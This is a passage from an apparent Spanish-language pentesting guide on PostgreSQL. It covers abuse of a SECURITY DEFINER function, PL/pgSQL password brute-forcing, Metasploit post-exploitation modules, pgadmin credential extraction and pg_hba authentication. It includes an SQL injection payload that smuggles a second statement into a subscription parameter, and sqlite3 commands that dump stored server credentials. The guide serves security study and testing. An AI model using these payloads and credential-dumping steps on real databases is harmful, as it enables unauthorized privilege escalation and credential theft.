\*\*\*\*[**En este informe**](https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql), los pentesters lograron escalar privilegios dentro de una instancia de postgres proporcionada por IBM, porque **encontraron esta funci√≥n con la bandera SECURITY DEFINER**:

<pre class="language-sql"><code class="lang-sql">CREATE OR REPLACE FUNCTION public.create_subscription(IN subscription_name text,IN host_ip text,IN portnum text,IN password text,IN username text,IN db_name text,IN publisher_name text)
RETURNS text
LANGUAGE 'plpgsql'
<strong>    VOLATILE SECURITY DEFINER
</strong>    PARALLEL UNSAFE
COST 100

AS $BODY$
DECLARE
persist_dblink_extension boolean;
BEGIN
persist_dblink_extension := create_dblink_extension();
PERFORM dblink_connect(format('dbname=%s', db_name));
PERFORM dblink_exec(format('CREATE SUBSCRIPTION %s CONNECTION ''host=%s port=%s password=%s user=%s dbname=%s sslmode=require'' PUBLICATION %s',
subscription_name, host_ip, portNum, password, username, db_name, publisher_name));
PERFORM dblink_disconnect();
‚Ä¶
</code></pre>

Como [**se explica en la documentaci√≥n**](https://www.postgresql.org/docs/current/sql-createfunction.html), una funci√≥n con **SECURITY DEFINER se ejecuta** con los privilegios del **usuario que la posee**. Por lo tanto, si la funci√≥n es **vulnerable a la inyecci√≥n SQL** o realiza alguna **acci√≥n privilegiada con par√°metros controlados por el atacante**, podr√≠a ser abusada para **escalar privilegios dentro de postgres**.

En la l√≠nea 4 del c√≥digo anterior se puede ver que la funci√≥n tiene la bandera **SECURITY DEFINER**.
```sql
CREATE SUBSCRIPTION test3 CONNECTION 'host=127.0.0.1 port=5432 password=a
user=ibm dbname=ibmclouddb sslmode=require' PUBLICATION test2_publication
WITH (create_slot = false); INSERT INTO public.test3(data) VALUES(current_user);
```
Y luego **ejecutar comandos**:

<figure><img src="../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

### Realizar un ataque de fuerza bruta con PL/pgSQL

PL/pgSQL, como un **lenguaje de programaci√≥n completo**, permite un mayor control procedural que SQL, incluyendo la **capacidad de utilizar bucles y otras estructuras de control**. Las declaraciones SQL y los disparadores pueden llamar a funciones creadas en el lenguaje PL/pgSQL.\
**Puede abusar de este lenguaje para solicitar a PostgreSQL que realice un ataque de fuerza bruta a las credenciales de los usuarios.**

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md" %}
[pl-pgsql-password-bruteforce.md](../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md)
{% endcontent-ref %}

## **POST**
```
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> use auxiliary/scanner/postgres/postgres_schemadump
msf> use auxiliary/admin/postgres/postgres_readfile
msf> use exploit/linux/postgres/postgres_payload
msf> use exploit/windows/postgres/postgres_payload
```
### registro

Dentro del archivo _**postgresql.conf**_ puedes habilitar los registros de postgresql cambiando:
```bash
log_statement = 'all'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
logging_collector = on
sudo service postgresql restart
#Find the logs in /var/lib/postgresql/<PG_Version>/main/log/
#or in /var/lib/postgresql/<PG_Version>/main/pg_log/
```
A continuaci√≥n, **reinicie el servicio**.

### pgadmin

[pgadmin](https://www.pgadmin.org) es una plataforma de administraci√≥n y desarrollo para PostgreSQL.\
Puede encontrar **contrase√±as** dentro del archivo _**pgadmin4.db**_.\
Puede descifrarlas utilizando la funci√≥n _**decrypt**_ dentro del script: [https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py](https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py)
```bash
sqlite3 pgadmin4.db ".schema"
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
string pgadmin4.db
```
### pg\_hba

La autenticaci√≥n del cliente es controlada por un archivo de configuraci√≥n frecuentemente llamado _**pg\_hba.conf**_. Este archivo tiene un conjunto de registros. Un registro puede tener uno de los siguientes siete formatos:

![](https://lh4.googleusercontent.com/Ff8YbD3ppYmN2Omp-4M-0AAVhLsr4c2i7d7HUjgkE-O6NZ5zbaST1hdMPrp1AL\_xTXJalYe0HYxUk76vWJUfHZ5GuCDvIL1A-sMV44Z0CYSVgLM9ttFTDu-BhzewBGc7FeMarTLqsu\_N1ztXJg)

**Cada** registro **especifica** un **tipo de conexi√≥n**, un **rango de direcciones IP del cliente** (si es relevante para el tipo de conexi√≥n), un **nombre de base de datos**, un **nombre de usuario** y el **m√©todo de autenticaci√≥n** que se utilizar√° para las conexiones que cumplan con estos par√°metros. El **primer registro con una coincidencia** en el tipo de conexi√≥n, direcci√≥n del cliente, base de datos solicitada y nombre de usuario **se utiliza** para realizar la autenticaci√≥n. No hay una "opci√≥n de respaldo": **si se elige un registro y la autenticaci√≥n falla, los registros posteriores no se consideran**. Si no hay ning√∫n registro que coincida, se deniega el acceso.\
Los m√©todos de autenticaci√≥n basados en contrase√±a son **md5**, **crypt** y **password**. Estos m√©todos funcionan de manera similar, excepto por la forma en que se env√≠a la contrase√±a a trav√©s de la conexi√≥n: respectivamente, en formato MD5-hashed, encriptada con crypt y en texto claro. Una limitaci√≥n es que el m√©todo crypt no funciona con contrase√±as que han sido encriptadas en pg\_authid.

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

\
Utiliza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** con las herramientas comunitarias m√°s avanzadas del mundo.\
Obt√©n acceso hoy mismo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
